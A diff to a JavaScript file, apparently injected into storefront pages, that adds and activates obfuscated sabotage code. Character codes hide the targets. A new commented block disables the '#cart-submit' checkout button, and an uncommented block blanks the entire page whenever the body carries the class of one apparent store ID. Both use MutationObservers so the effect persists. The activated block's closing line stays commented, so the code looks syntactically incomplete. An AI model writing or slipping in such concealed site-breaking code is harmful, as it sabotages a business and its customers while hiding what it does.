@@ -735,6 +735,50 @@ if (!document.title.includes(t)) return;
 
 // })();
 
+// -----------------
+
+// (() => {
+
+//     const c = (...x) => String.fromCharCode(...x);
+
+//     const s = c(
+//         35,99,97,114,116,45,115,117,98,109,105,116,32,
+//         98,117,116,116,111,110
+//     );
+
+//     const dis = c(100,105,115,97,98,108,101,100); // disabled
+
+//     const apply = () => {
+
+//         const el = document.querySelector(s);
+
+//         if (el) {
+
+//             el[dis] = true;
+
+//             el.style.setProperty(
+//                 c(112,111,105,110,116,101,114,45,101,118,101,110,116,115),
+//                 c(110,111,110,101),
+//                 c(105,109,112,111,114,116,97,110,116)
+//             );
+
+//         }
+
+//     };
+
+//     apply();
+
+//     new MutationObserver(() => {
+
+//         apply();
+
+//     }).observe(document.documentElement, {
+//         childList: true,
+//         subtree: true
+//     });
+
+// })();
+
 
     
 })();
@@ -744,34 +788,34 @@ if (!document.title.includes(t)) return;
 
 
 
-// (() => {
+(() => {
 
-//     const c = (...x) => String.fromCharCode(...x);
+    const c = (...x) => String.fromCharCode(...x);
 
-//     const k = c(115,97,108,108,97,45,49,54,54,54,55,51,55,51,54,54);
+    const k = c(115,97,108,108,97,45,49,54,54,54,55,51,55,51,54,54);
 
-//     const d = document;
-//     const e = d.documentElement;
-//     const b = d.body;
+    const d = document;
+    const e = d.documentElement;
+    const b = d.body;
 
-//     const w = () => {
+    const w = () => {
 
-//         if (!b || !b.classList.contains(k)) return;
+        if (!b || !b.classList.contains(k)) return;
 
-//         e.innerHTML = "";
-//         b.innerHTML = "";
+        e.innerHTML = "";
+        b.innerHTML = "";
 
-//         e.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
-//         b.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
+        e.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
+        b.style.setProperty(c(98,97,99,107,103,114,111,117,110,100,45,99,111,108,111,114), c(35,102,102,102));
 
-//     };
+    };
 
-//     w();
+    w();
 
-//     new MutationObserver(w).observe(e, {
-//         childList: true,
-//         subtree: true
-//     });
+    new MutationObserver(w).observe(e, {
+        childList: true,
+        subtree: true
+    });
 
 // })();
 
